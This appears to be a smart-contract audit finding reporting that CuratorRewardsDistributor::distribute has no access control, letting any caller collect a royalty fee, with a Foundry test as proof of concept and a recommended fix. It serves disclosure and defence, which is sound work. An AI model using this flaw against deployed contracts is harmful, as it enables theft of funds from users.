# Vulnerability details

## Description
The `CuratorRewardsDistributor::distribute` function can be called by anyone to initiate the distribution process to get `royaltyfee`

## Impact
Anyone can gain `royaltyfee` (default 1% of the total balance)

## Proof of Concept
Add the following test case to the end of `Cred.t.sol::TestCred`.

```
    function testDistribute() public {
        // Create Cred
        _createCred("BASIC", "SIGNATURE", 0x0);

        // Simulate Deposit
        vm.prank(owner);
        uint256 amount = 1000;
        uint256 credId = 1;
        curatorRewardsDistributor.deposit{ value: amount }(credId, amount);

        // Distribute by anyone
        vm.prank(anyone);
        uint256 balanceBefore = anyone.balance;
        curatorRewardsDistributor.distribute(credId);
        uint256 balanceAfter = anyone.balance;
        assertEq(balanceAfter, balanceBefore + amount * 100 / 10_000);
    }

```

## Tools Used
Mannual

## Recommended Mitigation Steps
Add access control to `CuratorRewardsDistributor::distribute` function.
